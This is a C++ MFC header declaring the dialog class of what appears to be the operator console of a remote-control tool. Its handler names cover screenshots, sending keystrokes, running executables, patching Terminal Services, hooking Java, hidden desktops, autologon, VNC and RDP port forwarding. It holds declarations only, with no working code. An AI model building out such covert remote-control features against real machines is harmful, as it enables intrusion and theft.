#pragma once
#include "Listener.h"
#include "ClientViewCtrl.h"
#include "PlaceKeeper.h"
#include "afxwin.h"
#include "clistboxebx.h"
// CClientDlg dialog


class CClientDlg : public CDialog
{
	DECLARE_DYNAMIC(CClientDlg)

public:
	CClientDlg(CWnd* pParent = NULL);   // standard constructor
	virtual ~CClientDlg();
	HACCEL hF4;

// Dialog Data
	enum { IDD = IDD_CLIENT_DIALOG };
	

	CClient *m_pClient;
	CListener *m_pListener;
	HWND m_ParentHWND;

	void Log( LPCTSTR pszFormat, ... );

protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support

	CPlaceKeeper m_PlaceKeeper;

	DECLARE_MESSAGE_MAP()
	virtual void PostNcDestroy();
	virtual void OnCancel();
	virtual void OnOK();
public:
	virtual BOOL OnInitDialog();
	afx_msg LRESULT OnLoadControl( WPARAM wp, LPARAM lp );
	afx_msg LRESULT OnNetworkActivity( WPARAM wp, LPARAM lp );
	afx_msg LRESULT OnWinListChanged( WPARAM wp, LPARAM lp );
	afx_msg LRESULT OnFileListChanged( WPARAM wp, LPARAM lp );
	afx_msg LRESULT OnGatewayIPsChanged( WPARAM wp, LPARAM lp );
	afx_msg LRESULT OnProcessListChanged( WPARAM wp, LPARAM lp );
	afx_msg LRESULT OnFileGet( WPARAM wp, LPARAM lp );
	afx_msg LRESULT OnDriverListChanged( WPARAM wp, LPARAM lp );

	afx_msg LRESULT OnWinShotReceived( WPARAM wp, LPARAM lp );
	afx_msg LRESULT OnClickConfirmed( WPARAM wp, LPARAM lp );
	afx_msg LRESULT OnKeysConfirmed( WPARAM wp, LPARAM lp );
	afx_msg LRESULT OnRunConfirmed( WPARAM wp, LPARAM lp );
	afx_msg LRESULT OnOptionsConfirmed( WPARAM wp, LPARAM lp );
	afx_msg LRESULT OnWinCmdConfirmed( WPARAM wp, LPARAM lp );
	afx_msg LRESULT OnPatchInfoReceived( WPARAM wp, LPARAM lp );
	afx_msg LRESULT OnPatchStartConfirmed( WPARAM wp, LPARAM lp );
	afx_msg LRESULT OnClientLClick( WPARAM wp, LPARAM lp );
	afx_msg LRESULT OnClientRClick( WPARAM wp, LPARAM lp );
	afx_msg LRESULT OnPatchTermSrv( WPARAM wp, LPARAM lp );
	afx_msg LRESULT OnKillProces( WPARAM wp, LPARAM lp );

	afx_msg LRESULT OnClientVLC( WPARAM wp, LPARAM lp );
	afx_msg LRESULT OnClientRDP( WPARAM wp, LPARAM lp );

	BOOL  PreTranslateMessage(MSG* pMsg);

public:
	afx_msg void OnLbnSelchangeWindowList();
public:
	//CListBox m_WindowList;
	CListBoxEBX m_TextWinList1;
	CClientViewCtrl m_ClientView;
	CListBox m_LogList;
public:
	afx_msg void OnBnClickedRefreshBtn();
public:
	afx_msg void OnSize(UINT nType, int cx, int cy);
public:
	afx_msg void OnSizing(UINT fwSide, LPRECT pRect);
public:
	afx_msg void OnBnClickedRefreshwndBtn();
public:
	afx_msg void OnBnClickedRunIe();
public:
	CButton m_VFlip;
public:
	CButton m_HFlip;
public:
	afx_msg void OnBnClickedVflip();
public:
	afx_msg void OnBnClickedHflip();
public:
	CStatic m_Status;
public:
	CButton m_DoubleClicks;
public:
	afx_msg void OnBnClickedPatchStatus();
public:
	afx_msg void OnBnClickedPatchJava();
public:
	afx_msg void OnBnClickedCmdMin();
public:
	afx_msg void OnBnClickedCmdMax();
public:
	afx_msg void OnBnClickedHookApp();
public:
	afx_msg void OnBnClickedSetOptions();
	afx_msg void OnBnClickedButton1();
	afx_msg void OnBnClickedButton2();
	afx_msg void OnBnClickedCheck1();
	CButton m_DoubleClick;
	afx_msg void OnBnClickedCheck2();
	CButton m_AutoUpdate;
	static DWORD WINAPI UpdateThread( LPVOID lpThreadParameter );
	afx_msg void OnBnClickedButton3();
	afx_msg void OnBnClickedButton5();
	CButton m_isDellFile;
	afx_msg void OnBnClickedProcdlgBtn();
	afx_msg void OnBnClickedHookJava();
	afx_msg void OnBnClickedCmdShow();
	afx_msg void OnBnClickedCmdHide();
	afx_msg void OnBnClickedCmdShow2();

	afx_msg void OnBnClickedButton4();
	afx_msg void OnLbnSelchangeList1();


	afx_msg void OnAccelerator32776();

	afx_msg void OnAccelerator_F4();
	afx_msg void OnAccelerator32772();
	afx_msg void OnAccelerator32774();
	afx_msg void OnBnClickedCreateVpnXxx();
	afx_msg void OnBnClickedOpenVpnXxx();
	afx_msg void OnBnClickedCloseVpnXxx();
	afx_msg void OnBnClickedPatch();
	afx_msg void OnBnClickedReboot();
	afx_msg void OnBnClickedPass();
	afx_msg void OnBnClickedCmdDesk1();
	afx_msg void OnBnClickedCmdDesk2();
	
	afx_msg void OnBnClickedAutologonCheck();
	afx_msg void OnBnClickedAutologonOn();
	afx_msg void OnComandMaximize();
	afx_msg void OnBnClickedCheck3();
	afx_msg void OnToolsAutologonoff();
	afx_msg void OnJavaMovejava();
	afx_msg void OnOptionsFulllistofwindows();
	afx_msg void OnComandRemotereboot2();
	afx_msg void OnBnClickedSs();
	afx_msg void OnRdpCreatevpnmanualy();
	afx_msg void OnRdpConnectionstate();
	afx_msg void OnBnClickedMove();
	afx_msg void OnRdpDeletevpn();
	afx_msg void OnOptionsHidefromseconddesc();
	afx_msg void OnBnClickedDconfig();
	afx_msg void OnComandCloseSb();
	afx_msg void OnRdpLoaddll();
	afx_msg void OnRdpClosedll();
	afx_msg void OnRdpPortforw();
	afx_msg void OnVncStart();
	afx_msg void OnVncStop();
	afx_msg void OnBnClickedButtonTest();
	afx_msg void OnPortforwardingVnc();
	afx_msg void OnPortforwardingRdp();
	afx_msg void OnComandRunexe();
	afx_msg void OnLButtonDown(UINT nFlags, CPoint point);

	DWORD_PTR GetId()
	{
		int iItem = m_TextWinList1.GetCurSel( );
		if( iItem >= 0 )
			return m_TextWinList1.GetItemData1( iItem );
		return NULL;
	}
};
